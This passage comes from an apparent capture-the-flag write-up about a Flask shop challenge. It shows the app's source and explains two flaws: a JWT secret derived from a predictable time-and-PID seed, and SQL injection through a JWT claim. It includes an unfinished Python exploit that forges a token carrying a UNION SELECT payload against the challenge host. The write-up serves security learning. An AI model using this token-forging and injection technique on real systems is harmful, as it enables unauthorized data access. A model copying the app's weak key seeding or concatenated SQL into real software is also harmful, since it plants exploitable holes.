        <span class="n">existing_user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">).</span><span class="nf">first</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">existing_user</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">register.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">Username already taken</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">hashed_password</span> <span class="o">=</span> <span class="nf">generate_password_hash</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
        <span class="n">new_user</span> <span class="o">=</span> <span class="nc">User</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">hashed_password</span><span class="p">)</span>
        <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">new_user</span><span class="p">)</span>
        <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">login</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">register.html</span><span class="sh">'</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/preferences</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
<span class="nd">@jwt_required</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">preferences</span><span class="p">():</span>
    <span class="n">claims</span> <span class="o">=</span> <span class="nf">get_jwt</span><span class="p">()</span>
    <span class="n">current_user</span> <span class="o">=</span> <span class="nf">get_jwt_identity</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">:</span>
        <span class="n">favorite_product_id</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="sh">'</span><span class="s">favorite_product</span><span class="sh">'</span><span class="p">])</span>
        <span class="n">product</span> <span class="o">=</span> <span class="n">Product</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">favorite_product_id</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">product</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">preferences.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="sh">"</span><span class="s">Product does not exist</span><span class="sh">"</span><span class="p">,</span> <span class="n">products</span><span class="o">=</span><span class="n">Product</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">all</span><span class="p">(),</span> <span class="n">current_user</span><span class="o">=</span><span class="n">current_user</span><span class="p">)</span>
        <span class="n">new_token</span> <span class="o">=</span> <span class="nf">create_access_token</span><span class="p">(</span><span class="n">identity</span><span class="o">=</span><span class="nf">get_jwt_identity</span><span class="p">(),</span> <span class="n">additional_claims</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">favorite_product</span><span class="sh">'</span><span class="p">:</span> <span class="n">favorite_product_id</span><span class="p">})</span>
        <span class="n">resp</span> <span class="o">=</span> <span class="nf">make_response</span><span class="p">(</span><span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">'</span><span class="s">home</span><span class="sh">'</span><span class="p">)))</span>
        <span class="nf">set_access_cookies</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">new_token</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">resp</span>
    <span class="n">products</span> <span class="o">=</span> <span class="n">Product</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">all</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">preferences.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">products</span><span class="o">=</span><span class="n">products</span><span class="p">,</span> <span class="n">favorite_product</span><span class="o">=</span><span class="n">claims</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product</span><span class="sh">'</span><span class="p">),</span> <span class="n">current_user</span><span class="o">=</span><span class="n">current_user</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/favorite_product_info</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@jwt_required</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">favorite_product_info</span><span class="p">():</span>
    <span class="n">claims</span> <span class="o">=</span> <span class="nf">get_jwt</span><span class="p">()</span>
    <span class="n">favorite_product_id</span> <span class="o">=</span> <span class="n">claims</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">favorite_product_id</span><span class="p">:</span>
        <span class="n">favorite_product</span> <span class="o">=</span> <span class="n">Product</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">favorite_product_id</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">favorite_product</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="nf">text</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM product WHERE id = </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">favorite_product_id</span><span class="p">))).</span><span class="nf">fetchone</span><span class="p">()</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">product</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">e</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">product</span><span class="o">=</span><span class="n">favorite_product</span><span class="p">)</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">product</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/check_auth</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@jwt_required</span><span class="p">(</span><span class="n">optional</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">check_auth</span><span class="p">():</span>
    <span class="n">claims</span> <span class="o">=</span> <span class="nf">get_jwt</span><span class="p">()</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">(</span><span class="n">logged_in</span><span class="o">=</span><span class="nf">get_jwt_identity</span><span class="p">()</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">,</span> <span class="n">favorite_product</span><span class="o">=</span><span class="n">claims</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product</span><span class="sh">'</span><span class="p">)),</span> <span class="mi">200</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/healthz</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">healthz</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">jsonify</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="sh">"</span><span class="s">OK</span><span class="sh">"</span><span class="p">,</span> <span class="n">uptime</span><span class="o">=</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">up</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">create_data</span><span class="p">():</span>
    <span class="c1"># clear all Product db
</span>    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span><span class="n">Product</span><span class="p">).</span><span class="nf">delete</span><span class="p">()</span>
    
    <span class="n">product1</span> <span class="o">=</span> <span class="nc">Product</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sa">f</span><span class="sh">'</span><span class="s">Space Cookie</span><span class="sh">'</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">Cookies so delicate, they might just break! No need for brute force, one bite and they’ll melt right into your hands.</span><span class="sh">'</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="n">random</span><span class="p">.</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span>
    <span class="n">product2</span> <span class="o">=</span> <span class="nc">Product</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">'</span><span class="s">Syringe</span><span class="sh">'</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">To, hum, inject yourself with medicine I guess ?</span><span class="sh">'</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="n">random</span><span class="p">.</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span>
    <span class="n">product3</span> <span class="o">=</span> <span class="nc">Product</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">'</span><span class="s">Cool looking leaf</span><span class="sh">'</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="sh">'</span><span class="s">To add a nice scent to your house :)</span><span class="sh">'</span><span class="p">,</span> <span class="n">price</span><span class="o">=</span><span class="n">random</span><span class="p">.</span><span class="nf">randrange</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">100</span><span class="p">))</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">flag.txt</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="nc">Flag</span><span class="p">(</span><span class="n">flag</span><span class="o">=</span><span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">().</span><span class="nf">strip</span><span class="p">())</span>
    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">product1</span><span class="p">)</span>
    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">product2</span><span class="p">)</span>
    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">product3</span><span class="p">)</span>
    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
    <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">with</span> <span class="n">app</span><span class="p">.</span><span class="nf">app_context</span><span class="p">():</span>
        <span class="n">db</span><span class="p">.</span><span class="nf">create_all</span><span class="p">()</span>
        <span class="nf">create_data</span><span class="p">()</span>
    <span class="n">app</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="sh">"</span><span class="s">0.0.0.0</span><span class="sh">"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>
<p>There are several vulnerabilities in this code !</p>

<h4 id="jwt-secret-key"><span class="me-2">JWT Secret Key</span><a href="#jwt-secret-key" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>The JWT secret key is generated as follows:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">up</span> <span class="o">=</span> <span class="n">math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">())</span>
<span class="n">random</span><span class="p">.</span><span class="nf">seed</span><span class="p">(</span><span class="n">up</span> <span class="o">+</span> <span class="n">os</span><span class="p">.</span><span class="nf">getpid</span><span class="p">())</span>

<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">SECRET_KEY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="sh">'</span><span class="s">JWT_SECRET_KEY</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The main problem here is that we can harvest the <strong>pseudo-random</strong> value used to seed <code class="language-plaintext highlighter-rouge">random</code>, thus enabling us to regenerate the <strong>JWT secret key</strong>.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">os.getpid()</code>: if the webapp is running in a docker container, <strong>PID = 1</strong></li>
  <li><code class="language-plaintext highlighter-rouge">up</code>: there is a <code class="language-plaintext highlighter-rouge">/healthz</code> endpoint that <strong>leaks the uptime</strong> of the webapp</li>
</ul>

<p><a href="/assets/img/writeups/YourRegionsFinest/health.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/health.png" alt="index"  loading="lazy"></a></p>

<p>With this secret key, we should be able to sign any <strong>JWT token</strong> that we want.</p>

<h4 id="sql-injection"><span class="me-2">SQL Injection</span><a href="#sql-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/favorite_product_info</span><span class="sh">'</span><span class="p">)</span>
<span class="nd">@jwt_required</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">favorite_product_info</span><span class="p">():</span>
    <span class="n">claims</span> <span class="o">=</span> <span class="nf">get_jwt</span><span class="p">()</span>
    <span class="n">favorite_product_id</span> <span class="o">=</span> <span class="n">claims</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product</span><span class="sh">'</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">favorite_product_id</span><span class="p">:</span>
        <span class="n">favorite_product</span> <span class="o">=</span> <span class="n">Product</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">favorite_product_id</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">favorite_product</span> <span class="o">=</span> <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="nf">text</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM product WHERE id = </span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">favorite_product_id</span><span class="p">))).</span><span class="nf">fetchone</span><span class="p">()</span>
        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">product</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">error</span><span class="o">=</span><span class="n">e</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">product</span><span class="o">=</span><span class="n">favorite_product</span><span class="p">)</span>

    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">favorite_product_info.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">product</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">favorite_product_id</code> taken from the <strong>JWT</strong> is <code class="language-plaintext highlighter-rouge">NOT</code> subject to any validation/sanitization, and is directly passed to the <code class="language-plaintext highlighter-rouge">db.session.execute</code> function, without beign <em>“prepared”</em>.</p>

<p>Developers could cause: <em>“it comes from a JWT that is signed, so it’s safe”</em>.</p>

<p>But in this case, we’re able to <strong>generate and sign any JWT we want</strong>,  enabling us to put any SQL payload that we wan’t here ! So know we have a SQL injection.</p>

<h1 id="exploitation">Exploitation</h1>

<h3 id="understanding-the-jwt"><span class="me-2">Understanding the JWT</span><a href="#understanding-the-jwt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>First we need to create an account:</p>

<p><a href="/assets/img/writeups/YourRegionsFinest/register.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/register.png" alt="index"  loading="lazy"></a>
<em>Registering</em></p>

<p><a href="/assets/img/writeups/YourRegionsFinest/login.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/login.png" alt="index"  loading="lazy"></a>
<em>Login</em></p>

<p>Let’s get our JWT: <code class="language-plaintext highlighter-rouge">right-click, inspect -&gt; storage</code>, and inspect it to try to replicate it:</p>

<div file="original_jwt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="original_jwt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTczNzkzNDI1NCwianRpIjoiMTcyNWE3YTAtZTk4OS00ZjZlLWIxNGMtZmIxMTI4MDNhMDZkIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE3Mzc5MzQyNTQsImV4cCI6MTczNzkzNTE1NCwiZmF2b3JpdGVfcHJvZHVjdCI6bnVsbH0.kR_Ldv4MyQ-44zct8y5m7d893p_epYU8LA1DhhNYCDY
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/writeups/YourRegionsFinest/jwt_decoded.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/YourRegionsFinest/jwt_decoded.png" alt="index"  loading="lazy"></a></p>

<p>Time to script !</p>

<h3 id="scripting"><span class="me-2">Scripting</span><a href="#scripting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I wrote this simple python script to:</p>
<ul>
  <li>Determine the <code class="language-plaintext highlighter-rouge">JWT_SECRET_KEY</code></li>
  <li>Generate a JWT token with the SQL payload</li>
  <li>Sign it</li>
  <li>Displays it on the screen</li>
</ul>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">requests</span> <span class="kn">import</span> <span class="n">Session</span>
<span class="kn">from</span> <span class="n">time</span> <span class="kn">import</span> <span class="n">time</span><span class="p">,</span> <span class="n">sleep</span>
<span class="kn">from</span> <span class="n">math</span> <span class="kn">import</span> <span class="n">floor</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">uuid</span>

<span class="c1"># PyJWT
</span><span class="kn">import</span> <span class="n">jwt</span>

<span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://challenges.hackday.fr:58990/</span><span class="sh">"</span>
<span class="n">SESSION</span> <span class="o">=</span> <span class="nc">Session</span><span class="p">()</span>

<span class="c1"># Login using our credentials (test:test)
</span><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
	<span class="n">t</span> <span class="o">=</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span>
		<span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>
		<span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>
		<span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">true</span><span class="sh">"</span><span class="p">,</span>
	<span class="p">})</span>

	<span class="nf">if</span><span class="p">(</span><span class="ow">not</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/check_auth</span><span class="sh">"</span><span class="p">).</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">logged_in</span><span class="sh">"</span><span class="p">]):</span>
		<span class="nf">exit</span><span class="p">()</span>

<span class="c1"># Regenerate the `up` value (= server uptime)
# by getting informations from the /healthz endpont
</span><span class="k">def</span> <span class="nf">get_time</span><span class="p">():</span>
	<span class="n">server_uptime</span> <span class="o">=</span> <span class="n">SESSION</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="o">+</span><span class="sh">"</span><span class="s">/healthz</span><span class="sh">"</span><span class="p">).</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">uptime</span><span class="sh">"</span><span class="p">]</span>

	<span class="n">server_uptime</span> <span class="o">=</span> <span class="nf">floor</span><span class="p">(</span><span class="n">server_uptime</span><span class="p">)</span>
	<span class="n">current_time</span> <span class="o">=</span> <span class="nf">floor</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span>

	<span class="k">return</span> <span class="n">current_time</span> <span class="o">-</span> <span class="n">server_uptime</span>


<span class="k">def</span> <span class="nf">sign_jwt</span><span class="p">(</span><span class="n">secret_key</span><span class="p">):</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
		<span class="sh">"</span><span class="s">fresh</span><span class="sh">"</span><span class="p">:</span> <span class="bp">False</span><span class="p">,</span>            <span class="c1"># Not important
</span>		<span class="sh">"</span><span class="s">iat</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">()),</span>        <span class="c1"># Issue date
</span>		<span class="sh">"</span><span class="s">jti</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()),</span>  <span class="c1"># Unique JWT ID
</span>		<span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">access</span><span class="sh">"</span><span class="p">,</span>          <span class="c1"># Not important
</span>		<span class="sh">"</span><span class="s">sub</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">test</span><span class="sh">"</span><span class="p">,</span>             <span class="c1"># Our username
</span>		<span class="sh">"</span><span class="s">nbf</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span>    <span class="c1"># JWT is NOT valid BEFORE this date
</span>		<span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">:</span> <span class="nf">int</span><span class="p">(</span><span class="nf">time</span><span class="p">())</span><span class="o">+</span><span class="mi">2000</span><span class="p">,</span>   <span class="c1"># JWT expires AFTER this date 
</span>        
        <span class="c1"># I use a simple UNION query to get the flag
</span>		<span class="sh">"</span><span class="s">favorite_product</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">4 UNION SELECT null,null,null,flag,null,null FROM flag;</span><span class="sh">"</span> 
	<span class="p">}</span>

    <span class="c1"># Sign the JWT using the server's secret key
</span>	<span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">secret_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">token</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
	<span class="nf">login</span><span class="p">()</span>
	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] Logged in</span><span class="sh">"</span><span class="p">)</span>


	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] Calculating server uptime date and PID</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">time_start</span> <span class="o">=</span> <span class="nf">get_time</span><span class="p">()</span>

	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="si">{</span><span class="n">time_start</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\t</span><span class="s">1</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[&gt;] time_start=</span><span class="sh">"</span><span class="si">{</span><span class="n">time_start</span><span class="si">}</span><span class="sh">"</span><span class="s"> pid=</span><span class="sh">"</span><span class="s">1</span><span class="sh">"'</span><span class="p">)</span>
	<span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] Gathering server</span><span class="sh">'</span><span class="s">s seed</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="c1"># Seeding randpm with servers parameters 
</span>	<span class="n">random</span><span class="p">.</span><span class="nf">seed</span><span class="p">(</span><span class="n">time_start</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
    <span class="c1">#                        ^ os.getpid() = 1
</span>
    <span class="c1"># In a realistic scenario, we could also do some damage with the flask secret key
</span>	<span class="n">flask_secret_key</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>

    <span class="c1"># Generate the jwt_secret key
